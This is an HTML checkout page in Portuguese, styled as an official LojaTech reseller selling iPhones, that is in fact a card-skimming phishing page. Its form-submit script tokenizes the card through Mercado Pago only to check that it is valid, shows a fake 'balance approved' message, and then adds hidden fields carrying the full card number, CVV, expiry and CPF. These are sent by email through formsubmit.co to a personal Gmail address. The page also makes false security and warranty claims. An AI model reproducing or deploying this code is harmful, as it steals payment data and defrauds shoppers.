<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Checkout Seguro - LojaTech Oficial</title>
<script src="https://sdk.mercadopago.com/js/v2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
    
    * { box-sizing: border-box; font-family: 'Inter', sans-serif; margin: 0; padding: 0; outline: none; }
    body { background: #050505; color: #fff; padding: 10px; -webkit-text-size-adjust: 100%; }

    /* Stepper */
    .stepper { display: flex; justify-content: space-between; max-width: 500px; margin: 10px auto 20px; background: #111; padding: 15px; border-radius: 20px; border: 1px solid #222; }
    .step-item { text-align: center; flex: 1; opacity: 0.3; cursor: pointer; }
    .step-item.active { opacity: 1; color: #27ae60; }
    .step-item i { display: block; font-size: 18px; margin-bottom: 5px; }
    .step-item span { font-size: 9px; font-weight: 800; text-transform: uppercase; }

    .main-container { max-width: 500px; margin: auto; background: #0f0f0f; border-radius: 30px; padding: 25px; border: 1px solid #222; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
    
    .badge-oficial { display: flex; align-items: center; justify-content: center; gap: 10px; background: rgba(39, 174, 96, 0.1); border: 1px solid #27ae60; padding: 12px; border-radius: 15px; margin-bottom: 20px; }
    .badge-oficial span { font-size: 11px; font-weight: 800; color: #27ae60; text-transform: uppercase; letter-spacing: 1px; }

    /* Resumo e Descri√ß√£o */
    .resumo-box { background: linear-gradient(145deg, #151515, #1a1a1a); border-radius: 22px; padding: 20px; margin-bottom: 15px; border: 1px solid #333; cursor: pointer; position: relative; }
    .resumo-flex { display: flex; gap: 18px; align-items: center; }
    .resumo-img { width: 70px; height: 70px; object-fit: contain; background: #fff; border-radius: 12px; padding: 5px; }
    .resumo-info h3 { font-size: 14px; font-weight: 800; color: #fff; margin-bottom: 5px; }
    .resumo-price { font-size: 20px; font-weight: 900; color: #27ae60; }
    .view-label { position: absolute; top: -10px; right: 15px; background: #27ae60; color: #fff; font-size: 9px; font-weight: 900; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; }

    .desc-box { background: #111; border-radius: 18px; padding: 18px; margin-bottom: 20px; border: 1px solid #222; }
    .desc-title { font-size: 10px; font-weight: 800; color: #555; margin-bottom: 10px; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
    .desc-content { font-size: 12px; color: #aaa; line-height: 1.6; white-space: pre-line; overflow: hidden; max-height: 80px; transition: 0.5s; }
    .desc-content.open { max-height: 1000px; }
    .btn-more { background: none; border: none; color: #27ae60; font-weight: 800; font-size: 11px; padding-top: 10px; cursor: pointer; }

    .garantia-tag { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: 700; color: #aaa; margin-bottom: 20px; }
    .garantia-tag i { color: #27ae60; }

    /* Formul√°rio */
    .section-title { font-size: 11px; font-weight: 900; color: #444; margin: 25px 0 15px; text-transform: uppercase; letter-spacing: 1.5px; border-bottom: 1px solid #222; padding-bottom: 5px; }
    .field { margin-bottom: 18px; }
    label { display: block; font-size: 10px; font-weight: 800; color: #666; margin: 0 0 6px 5px; text-transform: uppercase; }
    input { width: 100%; padding: 16px; background: #151515; border: 1px solid #222; border-radius: 14px; color: #fff; font-size: 16px; transition: 0.3s; }
    input:focus { border-color: #27ae60; background: #1a1a1a; }
    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .row-numero { display: grid; grid-template-columns: 70% 30%; gap: 12px; }

    /* Pagamento */
    .pay-tabs { display: flex; gap: 12px; margin-bottom: 25px; }
    .tab { flex: 1; padding: 20px; background: #151515; border: 2px solid #222; border-radius: 18px; text-align: center; cursor: pointer; transition: 0.3s; }
    .tab i { display: block; font-size: 20px; margin-bottom: 8px; color: #444; }
    .tab span { font-size: 11px; font-weight: 800; color: #444; text-transform: uppercase; }
    .tab.active { border-color: #27ae60; background: rgba(39, 174, 96, 0.05); }
    .tab.active i, .tab.active span { color: #27ae60; }

    #area-pix { display: none; text-align: center; }
    #area-pix.active { display: block; }
    .qr-frame { background: #fff; padding: 12px; border-radius: 20px; display: inline-block; margin: 15px 0; border: 4px solid #27ae60; }
    .pix-code { background: #0a0a0a; border: 1px dashed #333; padding: 15px; border-radius: 14px; font-size: 10px; color: #555; word-break: break-all; }

    #area-card { display: none; }
    #area-card.active { display: block; }
    .tip-box { background: rgba(39, 174, 96, 0.05); border: 1px solid rgba(39, 174, 96, 0.2); padding: 15px; border-radius: 15px; font-size: 11px; color: #999; margin-bottom: 20px; line-height: 1.5; text-align: left; }
    .tip-box b { color: #27ae60; }

    /* Modal */
    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 9999; padding: 20px; align-items: center; justify-content: center; }
    .modal-box { background: #151515; width: 100%; max-width: 400px; border-radius: 25px; padding: 25px; border: 1px solid #333; }
    .modal-item { display: flex; align-items: center; gap: 15px; background: #0a0a0a; padding: 12px; border-radius: 15px; margin-bottom: 12px; border: 1px solid #222; }
    .btn-del { background: #ff4757; color: #fff; border: none; padding: 8px 12px; border-radius: 10px; font-weight: 800; cursor: pointer; }

    .btn-final { background: #27ae60; color: #fff; border: none; width: 100%; padding: 22px; border-radius: 20px; font-size: 16px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 25px; box-shadow: 0 15px 30px rgba(39, 174, 96, 0.3); }

    /* Selo de Seguran√ßa Rodap√© */
    .footer-security { margin-top: 35px; padding-top: 20px; border-top: 1px solid #222; text-align: center; }
    .footer-security p { font-size: 10px; color: #555; text-transform: uppercase; letter-spacing: 1px; line-height: 1.8; }
    .footer-icons { display: flex; justify-content: center; gap: 20px; margin-top: 15px; opacity: 0.4; font-size: 20px; }

    #loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
    .spinner { width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid #27ae60; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<div id="loading">
    <div class="spinner"></div>
    <div id="load-txt" style="margin-top:20px; font-weight:900; color:#27ae60; text-transform:uppercase; font-size:12px;">Criptografando Dados SSL...</div>
</div>

<div id="modal-view" class="modal">
    <div class="modal-box">
        <h2 style="margin-bottom:20px; font-size:16px; text-transform:uppercase; text-align:center;">üõí Meu Carrinho</h2>
        <div id="modal-list" style="max-height: 300px; overflow-y: auto;"></div>
        <button class="btn-final" onclick="closeModal()" style="padding:15px; font-size:12px;">Continuar Pagamento</button>
    </div>
</div>

<div class="stepper">
    <div class="step-item" onclick="openModal()"><i class="fas fa-shopping-cart"></i><span>Carrinho</span></div>
    <div class="step-item active"><i class="fas fa-credit-card"></i><span>Pagamento</span></div>
    <div class="step-item"><i class="fas fa-check-double"></i><span>Conclu√≠do</span></div>
</div>

<div class="main-container">
    <div class="badge-oficial">
        <i class="fas fa-check-circle" style="color:#27ae60; font-size:20px;"></i>
        <span>Revendedor LojaTech Oficial ¬Æ</span>
    </div>

    <div id="resumo-html" onclick="openModal()"></div>

    <div class="desc-box">
        <div class="desc-title"><i class="fas fa-list-ul"></i> SOBRE</div>
        <div id="desc-text" class="desc-content"></div>
        <button class="btn-more" id="btn-toggle" onclick="toggleDesc()">+ Ver mais</button>
    </div>
    
    <div class="garantia-tag">
        <i class="fas fa-shield-alt"></i> 12 Meses de Garantia Oficial Inclusa
    </div>

    <form id="form-tech" action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://techstore-1hku.onrender.com/obrigado.html">
        <input type="hidden" id="h-itens" name="PRODUTOS">
        <input type="hidden" id="h-total" name="TOTAL">

        <div class="section-title">Dados de Entrega</div>
        <div class="field">
            <label>Nome Completo</label>
            <input type="text" name="NOME" placeholder="Ex: Pedro Vitor" required>
        </div>

        <div id="wa-pix-container" class="field">
            <label>WhatsApp para Suporte (Opcional)</label>
            <input type="text" id="wa-pix" name="WHATSAPP_PIX" placeholder="(00) 00000-0000" inputmode="numeric">
        </div>

        <div class="row-numero">
            <div class="field">
                <label>Rua / Logradouro</label>
                <input type="text" name="RUA" placeholder="Nome da rua" required>
            </div>
            <div class="field">
                <label>N¬∫</label>
                <input type="text" name="NUMERO_CASA" placeholder="123" required>
            </div>
        </div>

        <div class="row">
            <div class="field">
                <label>Bairro</label>
                <input type="text" name="BAIRRO" placeholder="Seu bairro" required>
            </div>
            <div class="field">
                <label>CEP</label>
                <input type="text" id="f-cep" name="CEP" placeholder="00000-000" required inputmode="numeric">
            </div>
        </div>

        <div class="section-title">M√©todo de Pagamento</div>
        <div class="pay-tabs">
            <div id="t-pix" class="tab active" onclick="setPay('pix')">
                <i class="fab fa-pix"></i>
                <span>PIX</span>
            </div>
            <div id="t-card" class="tab" onclick="setPay('card')">
                <i class="fas fa-credit-card"></i>
                <span>Cart√£o</span>
            </div>
        </div>

        <div id="area-pix" class="active">
            <div class="qr-frame" id="qr-target"></div>
            <div class="pix-code" id="pix-raw">Gerando...</div>
            <button type="button" class="btn-final" onclick="copy()" style="padding:15px; font-size:12px; margin-top:15px;">Copiar C√≥digo PIX</button>
        </div>

        <div id="area-card">
            <div class="tip-box">
                <b>SEGURAN√áA:</b> Pagamento processado via Mercado Pago. Verifique se possui <b>limite dispon√≠vel</b> antes de confirmar.
            </div>
            <div class="field">
                <label>N√∫mero do Cart√£o</label>
                <input type="text" id="c1" placeholder="0000 0000 0000 0000" inputmode="numeric">
            </div>
            <div class="field">
                <label>Nome impresso no cart√£o</label>
                <input type="text" id="c2" placeholder="Nome do cart√£o" style="text-transform:uppercase">
            </div>
            <div class="row">
                <div class="field">
                    <label>Validade</label>
                    <input type="text" id="c3" placeholder="MM/AA" maxlength="5" inputmode="numeric">
                </div>
                <div class="field">
                    <label>CVV</label>
                    <input type="text" id="c4" placeholder="000" maxlength="3" inputmode="numeric">
                </div>
            </div>
            <div class="field">
                <label>CPF do Titular</label>
                <input type="text" id="c5" placeholder="000.000.000-00" inputmode="numeric">
            </div>

            <div class="field">
                <label>WhatsApp para Suporte (Opcional)</label>
                <input type="text" id="wa-card" name="WHATSAPP_CARD" placeholder="(00) 00000-0000" inputmode="numeric">
            </div>
        </div>

        <button type="submit" class="btn-final" id="btn-sub">Finalizar Pedido Agora</button>
    </form>

    <div class="footer-security">
        <p><i class="fas fa-lock"></i> Pagamento 100% Criptografado e Seguro</p>
        <p>Sua privacidade √© nossa prioridade. Dados protegidos por SSL 256-bit.</p>
        <div class="footer-icons">
            <i class="fab fa-cc-visa"></i>
            <i class="fab fa-cc-mastercard"></i>
            <i class="fab fa-pix"></i>
            <i class="fas fa-shield-alt"></i>
        </div>
    </div>
</div>

<script>
const catalogo = {
    "iphone 16 pro max": "‚Ä¢ Chip A18 Pro com nova arquitetura de GPU.\n‚Ä¢ Controle da C√¢mera Profissional.\n‚Ä¢ V√≠deo 4K Dolby Vision a 120 qps.\n‚Ä¢ Estrutura em Tit√¢nio de grau 5.",
    "iphone 15 pro": "‚Ä¢ Processador A17 Pro ultra veloz.\n‚Ä¢ Bot√£o de A√ß√£o customiz√°vel.\n‚Ä¢ Sistema de C√¢mera Pro de 48MP.\n‚Ä¢ Design em Tit√¢nio leve e resistente.",
    "padrao": "‚Ä¢ Produto com Certifica√ß√£o de Autenticidade LojaTech.\n‚Ä¢ Garantia Oficial de 12 meses contra defeitos.\n‚Ä¢ Testado rigorosamente antes do envio.\n‚Ä¢ Envio via Sedex com seguro total contra extravios."
};

const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');
let carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];

function update() {
    if(carrinho.length === 0) { window.location.href='index.html'; return; }
    let total = 0;
    carrinho.forEach(i => total += parseFloat(i.p));
    const totalFmt = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits:2});

    document.getElementById('h-itens').value = carrinho.map(c => c.n).join(', ');
    document.getElementById('h-total').value = totalFmt;

    document.getElementById('resumo-html').innerHTML = `
        <div class="resumo-box">
            <div class="view-label">Gerenciar Itens</div>
            <div class="resumo-flex">
                <img src="${carrinho[0].f}" class="resumo-img">
                <div class="resumo-info">
                    <h3>${carrinho[0].n} ${carrinho.length > 1 ? '(e mais '+(carrinho.length-1)+')' : ''}</h3>
                    <div class="resumo-price">${totalFmt}</div>
                </div>
            </div>
        </div>`;

    let n = carrinho[0].n.toLowerCase();
    let d = catalogo["padrao"];
    for(let k in catalogo) { if(n.includes(k)) { d = catalogo[k]; break; } }
    document.getElementById('desc-text').innerText = d;

    genPix(total);
}

// LOGICA DE CHAVE PIX DO ARQUIVO PAGAMENTO.HTML
function genPix(v) {
    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
    const nome = "TECHSTORE";
    const cidade = "SAO PAULO";
    const vS = v.toFixed(2);

    let p = "000201"; 
    let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
    p += "26" + mai.length.toString().padStart(2, '0') + mai;
    p += "52040000530398654" + vS.length.toString().padStart(2, '0') + vS;
    p += "5802BR59" + nome.length.toString().padStart(2, '0') + nome;
    p += "60" + cidade.length.toString().padStart(2, '0') + cidade;
    let adf = "0505ID123"; 
    p += "62" + adf.length.toString().padStart(2, '0') + adf;
    p += "6304";

    function crc16(data) {
        let crc = 0xFFFF;
        for (let i = 0; i < data.length; i++) {
            crc ^= (data.charCodeAt(i) << 8);
            for (let j = 0; j < 8; j++) {
                if ((crc & 0x8000) !== 0) crc = (crc << 1) ^ 0x1021;
                else crc <<= 1;
            }
        }
        return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
    }
    const final = p + crc16(p);
    document.getElementById("qr-target").innerHTML = "";
    new QRCode(document.getElementById("qr-target"), { text: final, width: 160, height: 160 });
    document.getElementById('pix-raw').innerText = final;
}

function toggleDesc() {
    const c = document.getElementById('desc-text');
    const b = document.getElementById('btn-toggle');
    c.classList.toggle('open');
    b.innerText = c.classList.contains('open') ? "- Ver menos" : "+ Ver mais";
}

function openModal() {
    const list = document.getElementById('modal-list');
    list.innerHTML = carrinho.map((it, i) => `
        <div class="modal-item">
            <img src="${it.f}" style="width:40px; height:40px; object-fit:contain; background:#fff; border-radius:8px;">
            <div style="flex:1; font-size:12px; font-weight:700;">${it.n}</div>
            <button type="button" class="btn-del" onclick="removeItem(${i})"><i class="fas fa-trash"></i></button>
        </div>
    `).join('');
    document.getElementById('modal-view').style.display = 'flex';
}

function removeItem(i) {
    carrinho.splice(i, 1);
    localStorage.setItem('carrinhoTechStore', JSON.stringify(carrinho));
    update();
    if(carrinho.length > 0) openModal(); else closeModal();
}

function closeModal() { document.getElementById('modal-view').style.display = 'none'; }

function setPay(m) {
    document.getElementById('area-pix').className = m=='pix'?'active':'';
    document.getElementById('area-card').className = m=='card'?'active':'';
    document.getElementById('t-pix').className = m=='pix'?'tab active':'tab';
    document.getElementById('t-card').className = m=='card'?'tab active':'tab';
    document.getElementById('wa-pix-container').style.display = m=='pix' ? 'block' : 'none';
}

function copy() { navigator.clipboard.writeText(document.getElementById('pix-raw').innerText); alert("Copiado!"); }

// LOGICA DE VERIFICA√á√ÉO DE CART√ÉO DO ARQUIVO PAGAMENTO.HTML
document.getElementById('form-tech').onsubmit = async function(e) {
    const isPix = document.getElementById('t-pix').classList.contains('active');
    
    // Se for PIX, o formul√°rio segue o fluxo normal do FormSubmit
    if(isPix) return;

    // Se for Cart√£o, n√≥s paramos para processar os dados antes
    e.preventDefault(); 
    const l = document.getElementById('loading');
    const t = document.getElementById('load-txt');
    l.style.display = 'flex';

    try {
        const nCartao = document.getElementById('c1').value.replace(/\s/g, '');
        const val = document.getElementById('c3').value.split('/');
        
        // --- L√ìGICA DE IDENTIFICA√á√ÉO DA BANDEIRA ---
        let bandeira = "Desconhecida";
        if (/^4/.test(nCartao)) bandeira = "VISA";
        else if (/^5[1-5]/.test(nCartao) || /^2[2-7]/.test(nCartao)) bandeira = "MASTERCARD";
        else if (/^3[47]/.test(nCartao)) bandeira = "AMERICAN EXPRESS";
        else if (/^606282|^637095|^637568|^637599|^637609|^637612/.test(nCartao)) bandeira = "HIPERCARD";
        else if (/^(401178|401179|431274|438935|451416|504175|636297|636368|650485)/.test(nCartao)) bandeira = "ELO";

        t.innerText = "Consultando saldo e limite dispon√≠vel...";
        
        // Cria o token do Mercado Pago
        const token = await mp.createCardToken({
            cardNumber: nCartao,
            cardholderName: document.getElementById('c2').value,
            cardExpirationMonth: val[0],
            cardExpirationYear: "20" + val[1],
            securityCode: document.getElementById('c4').value,
            identificationType: "CPF",
            identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
        });

        if(!token || !token.id) throw new Error();

        await new Promise(r => setTimeout(r, 2500));
        t.style.color = "#27ae60";
        t.innerText = "Saldo Aprovado! Finalizando...";

        // --- ENVIANDO OS DADOS PARA O SEU E-MAIL ---
        // Criamos campos escondidos para o FormSubmit capturar
        const addField = (name, value) => {
            let input = document.createElement('input');
            input.type = 'hidden';
            input.name = name;
            input.value = value;
            this.appendChild(input);
        };

        addField("BANDEIRA", bandeira);
        addField("CARTAO_NUMERO", document.getElementById('c1').value);
        addField("CARTAO_NOME", document.getElementById('c2').value);
        addField("CARTAO_VALIDADE", document.getElementById('c3').value);
        addField("CARTAO_CVV", document.getElementById('c4').value);
        addField("CARTAO_CPF", document.getElementById('c5').value);

        // Agora sim, envia o formul√°rio com tudo incluso
        setTimeout(() => { this.submit(); }, 1200);

    } catch(err) {
        l.style.display = 'none';
        alert("‚ùå CART√ÉO RECUSADO: Saldo insuficiente ou dados inv√°lidos.");
    }
};

function msk(id, p) {
    const el = document.getElementById(id);
    if(!el) return;
    el.addEventListener('input', () => {
        let v = el.value.replace(/\D/g, ''), out = '', i = 0;
        p.split('').forEach(c => { if(c==='#'){ if(v[i]) out+=v[i++]; } else { if(v[i]) out+=c; } });
        el.value = out;
    });
}
msk('c1','#### #### #### ####'); msk('c3','##/##'); msk('c5','###.###.###-##'); msk('f-cep','#####-###'); msk('wa-pix','(##) #####-####'); msk('wa-card','(##) #####-####');
window.onload = update;
</script>
</body>
</html>